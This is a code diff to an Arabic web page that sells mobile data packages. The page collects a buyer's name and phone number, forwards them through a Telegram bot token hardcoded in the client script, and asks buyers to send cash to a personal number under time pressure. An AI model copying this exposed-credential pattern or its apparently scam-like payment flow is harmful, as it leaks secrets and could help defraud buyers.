@@ -21,7 +21,6 @@ body {
     padding: 20px;
 }
 
-/* الرسائل */
 .message {
     background: #1e293b;
     padding: 18px;
@@ -32,20 +31,17 @@ body {
     white-space: pre-line;
 }
 
-/* الباقات */
 .package {
     background: #22c55e;
-    padding: 16px;
-    border-radius: 14px;
+    padding: 18px;
+    border-radius: 16px;
     margin-bottom: 12px;
     cursor: pointer;
+    text-align: center;
+    font-size: 16px;
+    font-weight: bold;
 }
 
-.package div {
-    margin-bottom: 8px;
-}
-
-/* الإدخال */
 input {
     width: 100%;
     padding: 14px;
@@ -54,7 +50,6 @@ input {
     border: none;
 }
 
-/* الأزرار */
 button {
     width: 100%;
     padding: 14px;
@@ -84,7 +79,6 @@ let selectedPackage = "";
 let userName = "";
 let userPhone = "";
 
-/* اختيار باقة */
 function choosePackage(el) {
     selectedPackage = el.innerText;
 
@@ -92,7 +86,6 @@ function choosePackage(el) {
     document.getElementById("step2").classList.remove("hidden");
 }
 
-/* التالي */
 function nextStep() {
 
     userName = document.getElementById("name").value.trim();
@@ -116,17 +109,14 @@ ${userName}
 ${userPhone}
 
 📦 الباقة
-
-${selectedPackage.replace(/\n/g, "<br>")}
+${selectedPackage}
 `;
 }
 
-/* واتساب */
 function openWhats() {
     window.open("https://wa.me/201227115782");
 }
 
-/* إرسال تليجرام */
 function sendToTelegram(btn) {
 
     let token = "8503388702:AAELn2ss_kjjPG2c3An1Hrt0PNLMXwzMRBI";
@@ -158,7 +148,7 @@ function sendToTelegram(btn) {
     });
 }
 
-</script></head><body><div class="container"><!-- البداية --><div id="step1"><div class="message">🔥 احجز باقتك الآن
+</script></head><body><div class="container"><div id="step1"><div class="message">🔥 احجز باقتك الآن
 
 📅 التفعيل يوم 16
 
@@ -166,25 +156,25 @@ function sendToTelegram(btn) {
 
 👇 اختار الباقة
 
-</div><div class="package" onclick="choosePackage(this)"><div>📶 40 جيجا</div>
-<div>📞 1500 دقيقة</div>
-<div>💰 400 جنيه</div></div><div class="package" onclick="choosePackage(this)"><div>📶 50 جيجا</div>
-<div>📞 1500 دقيقة</div>
-<div>💰 470 جنيه</div></div><div class="package" onclick="choosePackage(this)"><div>📶 60 جيجا</div>
-<div>📞 1500 دقيقة</div>
-<div>💰 540 جنيه</div></div><div class="package" onclick="choosePackage(this)"><div>📶 70 جيجا</div>
-<div>📞 1500 دقيقة</div>
-<div>💰 600 جنيه</div></div></div><!-- البيانات --><div id="step2" class="hidden"><div class="message">
+</div><div class="package" onclick="choosePackage(this)">
+📶 40 جيجا | 1500 دقيقة | 400 جنيه
+</div><div class="package" onclick="choosePackage(this)">
+📶 50 جيجا | 1500 دقيقة | 470 جنيه
+</div><div class="package" onclick="choosePackage(this)">
+📶 60 جيجا | 1500 دقيقة | 540 جنيه
+</div><div class="package" onclick="choosePackage(this)">
+📶 70 جيجا | 1500 دقيقة | 600 جنيه
+</div></div><div id="step2" class="hidden"><div class="message">
 👤 اكتب اسمك
 </div><input id="name" placeholder="الاسم"><div class="message">
 📱 اكتب رقمك
 </div><input id="phone" placeholder="رقم الموبايل"><button class="btn-green" onclick="nextStep()">
 التالي
-</button></div><!-- الدفع --><div id="step3" class="hidden"><div class="message">✅ تم تسجيل طلبك
+</button></div><div id="step3" class="hidden"><div class="message">✅ تم تسجيل طلبك
 
 ⏳ احجز مكانك قبل اكتمال العدد
 
-💵 حول الكاش على الرقم ده
+💵 رقم الكاش
 01024929685
 
 📸 ابعت صورة التحويل
